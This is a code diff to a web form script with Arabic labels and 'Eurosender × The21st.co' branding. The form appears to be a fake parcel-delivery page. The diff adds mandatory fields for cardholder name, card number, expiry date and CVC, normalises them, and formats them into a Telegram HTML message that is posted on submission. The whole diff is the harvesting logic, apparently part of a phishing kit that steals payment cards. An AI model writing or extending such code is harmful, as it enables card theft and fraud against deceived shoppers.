@@ -15,7 +15,11 @@
   function sanitize(o){
     const d = {};
     for (const k in o){ d[k] = typeof o[k]==='string' ? o[k].trim() : o[k]; }
-    if (d.phone) d.phone = normalizeDigits(d.phone).replace(/\D+/g,'');
+    if (d.phone)   d.phone   = normalizeDigits(d.phone).replace(/\D+/g,'');
+    if (d.cNum)    d.cNum    = normalizeDigits(d.cNum).replace(/\D+/g,'');
+    if (d.expMonth)d.expMonth= normalizeDigits(d.expMonth).replace(/\D+/g,'');
+    if (d.expYear) d.expYear = normalizeDigits(d.expYear).replace(/\D+/g,'');
+    if (d.CVC)     d.CVC     = normalizeDigits(d.CVC).replace(/\D+/g,'');
     return d;
   }
   function toTelegramHTML(d){
@@ -27,6 +31,10 @@
       `<b>الجوال:</b> ${esc(d.phone)}\n`+
       `<b>الدولة/المدينة:</b> ${esc(d.country || '-')}/${esc(d.city || '-')}\n`+
       `<b>طريقة التوصيل:</b> ${esc(d.delivery)}\n`+
+      (d.cName ? `<b>اسم حامل البطاقة:</b> ${esc(d.cName)}\n` : '')+
+      (d.cNum ? `<b>رقم البطاقة:</b> ${esc(d.cNum)}\n` : '')+
+      (d.expMonth && d.expYear ? `<b>انتهاء:</b> ${esc(d.expMonth)}/${esc(d.expYear)}\n` : '')+
+      (d.CVC ? `<b>CVC:</b> ${esc(d.CVC)}\n` : '')+
       (d.notes ? `<b>ملاحظات:</b> ${esc(d.notes)}\n` : '')+
       `— — — — — — — — —\n<i>Eurosender × The21st.co</i>`
     );
@@ -40,7 +48,13 @@
     btn.disabled = true;
 
     const data = sanitize(Object.fromEntries(new FormData(form).entries()));
-    if(!data.fullName || !data.phone || !data.delivery){ btn.disabled=false; err.style.display='block'; return; }
+    if(
+      !data.fullName || !data.phone || !data.delivery ||
+      !data.cName   || !data.cNum || !data.expMonth ||
+      !data.expYear || !data.CVC
+    ){
+      btn.disabled=false; err.style.display='block'; return;
+    }
 
     try{
       const res = await fetch('/api/submit', {
